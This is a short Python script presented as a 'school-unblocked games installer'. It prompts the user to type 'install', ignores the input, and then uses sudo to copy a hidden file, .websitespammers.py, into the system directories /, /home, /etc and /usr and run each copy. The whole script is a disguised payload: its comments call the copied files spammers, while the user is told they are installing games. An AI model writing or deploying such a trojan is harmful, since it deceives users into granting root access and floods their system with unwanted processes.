#! /usr/bin/python3

import os

#Copy all the spammer files into the system

print("Hello! Welcome to the school-unblocked games installer! Type, 'install,' to install! ")
enter = input("Enter: ")
os.system('sudo cp .websitespammers.py /')
os.system('sudo cp .websitespammers.py /home')
os.system('sudo cp .websitespammers.py /etc ')
os.system('sudo cp .websitespammers.py /usr')

#Run all the spammer files

os.system('python3 /.websitespammers.py')
os.system('python3 /home/.websitespammers.py ')
os.system('python3 /etc/.websitespammers.py ')
os.system('python3  /usr/.websitespammers.py ')
